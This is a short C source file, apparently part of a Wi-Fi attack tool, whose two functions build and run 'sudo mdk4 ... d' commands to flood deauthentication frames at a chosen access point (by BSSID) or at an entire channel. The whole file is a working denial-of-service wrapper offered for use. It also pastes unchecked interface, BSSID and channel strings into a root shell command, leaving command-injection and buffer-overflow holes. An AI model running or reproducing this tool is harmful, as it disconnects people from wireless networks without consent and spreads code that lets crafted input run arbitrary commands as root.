#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void bssid_attack(char iface[100], char BSSID[100]){
    char command[150];
    system("clear");
    printf(" Deauthenticating - Press ctrl+c to stop the attack\n\n");
    strcpy(command, "sudo mdk4 ");
    strcat(command, iface);
    strcat(command, " d -B ");
    strcat(command, BSSID);
    strcat(command, " -s 10000");
    system(command);
}

void channel_attack(char iface[100], char CHANNEL[4]){
    char command[150];
    system("clear");
    printf(" Deauthenticating - Press ctrl+c to stop the attack\n\n");
    strcpy(command, "sudo mdk4 ");
    strcat(command, iface);
    strcat(command, " d -c ");
    strcat(command, CHANNEL);
    strcat(command, " -s 10000");
    system(command);
}
